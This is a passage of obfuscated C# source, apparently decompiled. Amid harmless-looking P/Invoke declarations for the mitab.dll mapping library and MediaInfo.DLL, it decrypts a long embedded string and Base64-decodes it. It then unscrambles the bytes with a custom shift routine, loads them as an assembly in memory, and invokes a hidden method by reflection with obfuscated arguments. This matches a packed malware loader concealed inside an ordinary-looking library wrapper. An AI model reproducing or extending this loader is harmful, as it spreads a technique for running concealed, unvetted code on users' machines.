\u20e8\u20e8₆€₯₻₨ₐ\u20e8\u20e9ₖ€₴₻₫ₘ\u20e8\u20ea₰€₫₻₮₮\u20e8ₗ\u20ed₯₿₻₮₮\u20e8€ₖ₯₯₻₯₪\u20e8₯₰₮\u20e8₻€₄\u20e8₶ₖ₮\u20e9₻₭₲\u20e8\u20e9ₖ€₴₻₫ₘ\u20e8\u20ea\u20ed€₱₻₪₪\u20e8\u20eb₰€\u209f₻₫ₐ\u20e8\u20eb₰€₸₻₫₶\u20e8\u20ec\u20ed€₰₻₪\u20e7\u20e8₻₰€₲₻₫₲\u20e8\u20edₖ€₼₻₪\u20ef\u20e8₯ₖ€₻₻₫₄\u20e8\u20eb₰₮\u20e8₻₯₄\u20e8₹ₖ₮\u20e9₻₭₮\u20e8\u20e9ₖ€₮₻₪\u20eb\u20e8\u20e9\u20ed€₺₻₫\u20eb\u20e8₧ₖ€₼₻₫₺\u20e8\u20ed\u20ed₮\u20e8₻₰₮\u20e8\u20eb₆€₮₻₪₦\u20e8\u20ec\u20ed€₺₻₰₮\u20e8€₰₯\u209d₻₰₪\u20e8₧₰€₭₻₫₲\u20e8\u20ed₰€₨₻₪\u20ef\u20e8\u20e9₰€\u208f₻₪\u20e7\u20e8\u20e9ₖ€₪₻₫ₐ\u20e8\u20e8₆€₱₻₰₮\u20e8₯\u20ed₯₱₻₯₮\u20e8₯ₖ₯₯₻₯₶\u20e8₯₰₮\u20e8₻€ₔ\u20e8₹₰₮\u20e9₻€₪\u20e8\u20e9₆€₪₻₪\u20e7\u20e8\u20eb\u20ed€₽₻₫₄\u20e8\u20e6\u20ed₯₿₻₪ₜ\u20e8\u20ed\u20ed€₭₻₫\u20ef\u20e8\u20ea\u20ed€₮₻₫₶\u20e8₻₰₯€₻₯₶\u20e8₯₰₯₱₻₯₮\u20e8₯ₖ₯₯₻₰₮\u20e8₻₰₮\u20e8₻₰₮\u20e8₻₰", 8414));
		stringBuilder.Append(_003CModule_003E.Decrypt("ᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚄᚚᛜᚏᚍᛗᛗ", 5866));
		Assembly assembly = Assembly.Load(q7UZDIG77nvBq9zhem(Convert.FromBase64String(stringBuilder.ToString())));
		Type type = assembly.GetType(_003CModule_003E.Decrypt("\u1a9e\u1a9a᪗᪔᪖\u1adb\u1a9e\u1a9a᪗᪔᪖", 6901));
		object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(type));
		MethodInfo method = type.GetMethod(_003CModule_003E.Decrypt("ᏌᏈᏅᏆᏄ", 5031));
		ArrayList arrayList = new ArrayList();
		arrayList.Add(qXbqqAnJvo5L6Y3cHY);
		arrayList.Add(qWrEwlFfxusj3J7ts44g);
		method.Invoke(RuntimeHelpers.GetObjectValue(objectValue), new object[1] { arrayList });
		return null;
	}

	[DllImport("mitab.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern double _mitab_c_get_text_width_00404(long feature);

	[DllImport("mitab.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long _mitab_c_get_type_00404(long feature);

	[DllImport("mitab.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long _mitab_c_get_vertex_count_00408(long feature, long part);

	[DllImport("mitab.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern double _mitab_c_get_vertex_x_004012(long feature, long part, long vertex);

	[DllImport("mitab.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern double _mitab_c_get_vertex_y_004012(long feature, long part, long vertex);

	[DllImport("mitab.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long _mitab_c_getlasterrormsg_vb_00408([MarshalAs(UnmanagedType.VBByRefStr)] ref string errormsg, long l);

	[DllImport("mitab.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long _mitab_c_getlasterrorno_00400();

	[DllImport("mitab.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long _mitab_c_next_feature_id_00408(long handle, long last_feature_id);

	[DllImport("mitab.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long _mitab_c_open_00404([MarshalAs(UnmanagedType.VBByRefStr)] ref string filename);

	[DllImport("mitab.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long _mitab_c_read_feature_00408(long handle, long feature_id);

	[DllImport("mitab.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void _mitab_c_set_arc_004052(long feature, double center_x, double center_y, double x_radius, double y_radius, double start_angle, double end_angle);

	[DllImport("mitab.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void _mitab_c_set_brush_004020(long feature, long fg_color, long bg_color, long pattern, long transparent);

	[DllImport("mitab.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void _mitab_c_set_field_004012(long feature, long field_index, [MarshalAs(UnmanagedType.VBByRefStr)] ref string value);

	[DllImport("mitab.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void _mitab_c_set_font_00408(long feature, [MarshalAs(UnmanagedType.VBByRefStr)] ref string font_name);

	[DllImport("mitab.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void _mitab_c_set_pen_004016(long feature, long width, long pattern, long color);

	[DllImport("mitab.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void _mitab_c_set_points_004020(long feature, long part, long vertex_count, double x, double y);

	[DllImport("mitab.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void _mitab_c_set_symbol_004016(long feature, long symbol_no, long symbol_size, long symbol_color);

	[DllImport("mitab.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void _mitab_c_set_text_00408(long feature, [MarshalAs(UnmanagedType.VBByRefStr)] ref string text);

	[DllImport("mitab.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void _mitab_c_set_text_display_004048(long feature, double angle, double height, double width, long fg_color, long bg_color, long justification, long spacing, long linetype);

	[DllImport("mitab.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long _mitab_c_write_feature_00408(long handle, long feature);

	[DllImport("mitab.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long _mitab_c_get_field_width_00408(long handle, long field);

	[DllImport("mitab.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long _mitab_c_get_field_precision_00408(long handle, long field);

	[DllImport("mitab.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long _mitab_c_is_interior_ring_00408(long feature, long requestedringindex);

	[DllImport("mitab.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long _mitab_c_load_coordsys_table_00404([MarshalAs(UnmanagedType.VBByRefStr)] ref string filename);

	[DllImport("mitab.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long _mitab_c_get_feature_count_00404(long handle);

	[DllImport("mitab.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern double _mitab_c_get_field_as_double_vb_00408(long feature, long field);

	[DllImport("MediaInfo.DLL", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr MediaInfo_New();

	[DllImport("MediaInfo.DLL", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
	public static extern void MediaInfo_Delete(IntPtr Handle);

	[DllImport("MediaInfo.DLL", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
	public static extern UIntPtr MediaInfo_Open(IntPtr Handle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string FileName);

	[DllImport("MediaInfo.DLL", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
	public static extern void MediaInfo_Close(IntPtr Handle);

	public static byte[] q7UZDIG77nvBq9zhem(byte[] q4MB3n3Ikv6WlBBccnh)
	{
		checked
		{
			byte[] array = new byte[q4MB3n3Ikv6WlBBccnh.Length - 4 + 1];
			int num = q4MB3n3Ikv6WlBBccnh[0];
			int num2 = q4MB3n3Ikv6WlBBccnh.Length - 1;
			for (int i = 3; i <= num2; i++)
			{
				if ((num == q4MB3n3Ikv6WlBBccnh[1]) | (num > q4MB3n3Ikv6WlBBccnh[1]))
				{
					num = q4MB3n3Ikv6WlBBccnh[0];
				}
				int num3 = unchecked((int)q4MB3n3Ikv6WlBBccnh[i]) - num;
				if (num3 < 0)
				{
					num3 += 256;
				}
				if (num3 > 255)
				{
					num3 -= 256;
				}
				array[i - 3] = (byte)num3;
				num += 1 + unchecked((int)q4MB3n3Ikv6WlBBccnh[2]);
			}
			return array;
		}
	}
}
